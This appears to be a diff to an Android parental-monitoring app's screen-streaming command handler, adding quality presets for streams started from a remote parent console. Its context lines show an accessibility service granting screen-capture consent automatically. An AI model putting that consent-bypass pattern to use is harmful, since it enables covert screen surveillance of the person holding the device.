@@ -44,12 +44,14 @@ class ScreenCommandHandler(
         const val CMD_SCREEN_STOP = "SCREEN_STOP"
         const val CMD_STOP_SCREEN = "STOP_SCREEN"
         const val CMD_SCREEN_RECORDING_OFF = "SCREEN_RECORDING_OFF"
+        const val CMD_SCREEN_QUALITY_PREFIX = "SCREEN_QUALITY:"
 
         // Responses to Parent console (dual compatibility for desktop and mobile parents)
         const val RESP_SCREEN_STARTED = "SCREEN_STARTED"
         const val RESP_SCREEN_RECORDING_STARTED = "SCREEN_RECORDING_STARTED"
         const val RESP_SCREEN_STOPPED = "SCREEN_STOPPED"
         const val RESP_SCREEN_RECORDING_STOPPED = "SCREEN_RECORDING_STOPPED"
+        const val RESP_SCREEN_QUALITY_SET_PREFIX = "SCREEN_QUALITY_SET:"
         const val RESP_SCREEN_ERROR_PREFIX = "SCREEN_ERROR: "
     }
 
@@ -62,13 +64,22 @@ class ScreenCommandHandler(
      */
     fun handleCommand(command: String): Boolean {
         val normalized = command.trim()
-        return when (normalized) {
-            CMD_SCREEN_ON, CMD_SCREEN_START, CMD_START_SCREEN, CMD_SCREEN_RECORDING_ON -> {
-                handleScreenOn()
+        val baseCmd = normalized.substringBefore(':')
+        val arg = normalized.substringAfter(':', "")
+
+        return when {
+            baseCmd in setOf(CMD_SCREEN_ON, CMD_SCREEN_START, CMD_START_SCREEN, CMD_SCREEN_RECORDING_ON) -> {
+                val quality = ScreenQualityPreset.fromId(arg.ifBlank { null })
+                handleScreenOn(quality)
                 true
             }
-            CMD_SCREEN_OFF, CMD_SCREEN_STOP, CMD_STOP_SCREEN, CMD_SCREEN_RECORDING_OFF -> {
+            normalized in setOf(CMD_SCREEN_OFF, CMD_SCREEN_STOP, CMD_STOP_SCREEN, CMD_SCREEN_RECORDING_OFF) -> {
                 handleScreenOff()
+                true
+            }
+            normalized.startsWith(CMD_SCREEN_QUALITY_PREFIX) -> {
+                val quality = ScreenQualityPreset.fromId(arg)
+                handleScreenQualityUpdate(quality)
                 true
             }
             else -> false
@@ -76,10 +87,10 @@ class ScreenCommandHandler(
     }
 
     /**
-     * Handles the start screen command.
+     * Handles the start screen command with the requested [quality] preset.
      */
-    private fun handleScreenOn() {
-        Log.d(TAG, "Processing command: $CMD_SCREEN_ON")
+    private fun handleScreenOn(quality: ScreenQualityPreset = ScreenQualityPreset.FULL_HD_1080P) {
+        Log.d(TAG, "Processing command: $CMD_SCREEN_ON (quality=$quality)")
 
         // Step 1: Verify accessibility service permission for autonomous consent approval
         if (!screenController.hasAccessibilityPermission()) {
@@ -89,8 +100,9 @@ class ScreenCommandHandler(
             return
         }
 
-        // Step 2: If already active, immediately acknowledge with confirmations
+        // Step 2: If already active, ensure quality matches and acknowledge immediately
         if (screenController.isStreaming()) {
+            screenController.updateScreenQuality(quality)
             Log.d(TAG, "Screen streaming is already active. Acknowledging with $RESP_SCREEN_STARTED.")
             dataSender(RESP_SCREEN_STARTED)
             dataSender(RESP_SCREEN_RECORDING_STARTED)
@@ -99,6 +111,7 @@ class ScreenCommandHandler(
 
         // Step 3: Initiate screen streaming via ScreenController
         val initiated = screenController.startScreenStreaming(
+            quality = quality,
             onStarted = {
                 Log.d(TAG, "Screen streaming confirmed. Transmitting confirmation: $RESP_SCREEN_STARTED...")
                 dataSender(RESP_SCREEN_STARTED)
@@ -112,6 +125,19 @@ class ScreenCommandHandler(
 
         if (!initiated) {
             Log.e(TAG, "Failed to initiate screen capture pipeline")
+        }
+    }
+
+    /**
+     * Handles live screen mirror quality updates while streaming.
+     */
+    private fun handleScreenQualityUpdate(quality: ScreenQualityPreset) {
+        Log.d(TAG, "Processing command: $CMD_SCREEN_QUALITY_PREFIX${quality.id}")
+        val updated = screenController.updateScreenQuality(quality)
+        if (updated || !screenController.isStreaming()) {
+            dataSender("$RESP_SCREEN_QUALITY_SET_PREFIX${quality.id}")
+        } else {
+            dataSender("${RESP_SCREEN_ERROR_PREFIX}Failed to update screen quality")
         }
     }
 
